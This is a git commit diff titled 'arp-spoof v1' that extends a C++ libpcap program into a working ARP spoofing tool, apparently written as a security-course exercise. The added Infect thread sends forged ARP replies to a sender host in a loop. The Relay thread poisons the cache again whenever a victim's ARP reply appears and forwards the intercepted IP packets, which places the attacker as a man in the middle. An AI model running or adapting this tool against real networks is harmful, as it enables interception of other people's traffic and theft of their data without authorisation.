bb2fd3ff4cd8dbc076ec051b3b574fb8539c40ef
0mpang1-Kali-Desktop <seoyoun059@gmail.com>
2021-10-11 01:32:10 +0900

    arp-spoof v1

--- src/main.cpp
+++ src/main.cpp
@@ -15,6 +15,9 @@
 #include <arpa/inet.h>
 #include <netinet/ether.h>
 
+#include <signal.h>
+#include <thread>
+
 #include <list>
 #include <map>
 
@@ -34,8 +37,10 @@ struct EthIpPacket final {
 
 #pragma pack(push, 1)
 struct FlowInfo final {
+	Ip attackerIp = Ip(0);
 	Ip senderIp = Ip(0);
 	Ip targetIp = Ip(0);
+	Mac attackerMac = Mac::nullMac();
 	Mac senderMac = Mac::nullMac();
 	Mac targetMac = Mac::nullMac();
 	EthArpPacket infectPkt;
@@ -45,16 +50,28 @@ struct FlowInfo final {
 std::list<FlowInfo> flows;
 std::map<Ip, Mac> arpTable;
 
-void GetMyInfo(Ip *myIp, Mac *myMac, char* dev);
+void signal_handler (int sig);
+void GetMyInfo(Ip* myIp, Mac* myMac, char* dev);
 Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip);
 EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
 void SendArpPacket(pcap_t* handle, EthArpPacket packet);
+void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size);
+void Infect(pcap_t *handle);
+void Relay(pcap_t* handle);
 
+bool runThread = true;
 
 
 void usage() {
 	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
 	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
+}
+
+void signal_handler (int sig)
+{
+    printf("Interrupt Executed : %d\n",sig);
+    runThread = false;
+	exit(sig);
 }
 
 void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
@@ -70,7 +87,7 @@ void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
 		*myMac = Mac((uint8_t *)(ifr.ifr_hwaddr.sa_data));
     
     if(!ioctl(fd, SIOCGIFADDR, &ifr))
-		*myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
+		*myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in* )&ifr.ifr_addr)->sin_addr)));
 	
 	close(fd);
 	return;
@@ -102,7 +119,7 @@ Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
 
 		resPacket = (struct EthArpPacket *)replyPacket;
 		if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp){
-			mac = Mac((uint8_t *)(resPacket->arp_.smac_));
+			mac = Mac((uint8_t*)(resPacket->arp_.smac_));
 			return mac;
 		}
 		else continue;
@@ -143,6 +160,66 @@ void SendArpPacket(pcap_t* handle, EthArpPacket packet){
 	return;
 }
 
+void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size){
+	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+	return;
+}
+
+void Infect(pcap_t *handle){
+	while(runThread){
+		for(auto iter : flows){
+			SendArpPacket(handle, iter.infectPkt);
+			sleep(1);
+		}
+	}
+}
+
+void Relay(pcap_t* handle){
+	struct pcap_pkthdr* header;
+	const u_char* replyPacket;
+	while(runThread){
+
+		int res = pcap_next_ex(handle, &header, &replyPacket);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+		
+		EthHdr* eth = (struct EthHdr*)replyPacket;
+
+		// ArpPacket : reinfect
+		if(eth->type() == EthHdr::Arp){
+			EthArpPacket* arpPacket = (struct EthArpPacket*)replyPacket;
+			if(arpPacket->arp_.op() == ArpHdr::Reply){
+				for(auto iter : flows){
+					if(arpPacket->arp_.sip() == iter.senderIp && arpPacket->arp_.tip_ == iter.targetIp){
+						SendArpPacket(handle, iter.infectPkt);
+						sleep(1);
+						break;
+					}
+				}
+			}
+		}
+
+		// IpPacket : relay
+		if(eth->type() == EthHdr::Ip4){
+			EthIpPacket* ipPacket = (struct EthIpPacket*)replyPacket;
+				for(auto iter : flows){
+					if(ipPacket->ip_.sip() == iter.senderIp && ipPacket->ip_.dip() == iter.attackerIp){
+						ipPacket->eth_.smac_ = iter.attackerMac;
+						ipPacket->eth_.dmac_ = iter.targetMac;
+						SendIpPacket(handle, *ipPacket, header->caplen);
+						break;
+					}
+				}
+		}
+	}
+}
+
 int main(int argc, char* argv[]) {
 	if (argc < 4 || argc%2 ) {
 		printf("%d\n",argc);
@@ -170,9 +247,10 @@ int main(int argc, char* argv[]) {
 	
 	for(int i=1;i<argc/2;i++){
 		FlowInfo info;
+		info.attackerIp = attackerIp;
+		info.attackerMac = attackerMac;
 		info.senderIp = Ip(argv[2*i]);
 		info.targetIp = Ip(argv[2*i+1]);
-		flows.push_back(info);
 
 		//arpTable에 senderIp에 대한 정보가 있는지 확인
 		// if(auto ret = arpTable.count(info.senderIp))
@@ -192,8 +270,9 @@ int main(int argc, char* argv[]) {
 		// if(arpTable.insert({info.targetIp, tmp}).second)
 		// 	arpTable.insert({info.targetIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp)});
 		
+		
 		// info.senderMac = arpTable[info.senderIp];
-		// info.targetMac = arpTable[info.targetIp];
+		// info.targetMac = arpTable[flows.push_back(info);info.targetIp];
 
 		info.senderMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
 		info.targetMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
@@ -205,10 +284,18 @@ int main(int argc, char* argv[]) {
 		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).data());
 		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).data());
 		
-		info.infectPkt = MakeArpPacket(1, handle, attackerMac, info.senderMac, attackerMac, info.targetIp, info.senderMac, info.senderIp);
-		SendArpPacket(handle, info.infectPkt);
+		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
+		flows.push_back(info);
 		printf("Success Attack\n");
 	}
+
+	signal(SIGINT, signal_handler);
+	std::thread infect_t(Infect, handle);
+	std::thread relay_t(Relay, handle);
+	
+	infect_t.join();
+	relay_t.join();
+
 
 	pcap_close(handle);
 }
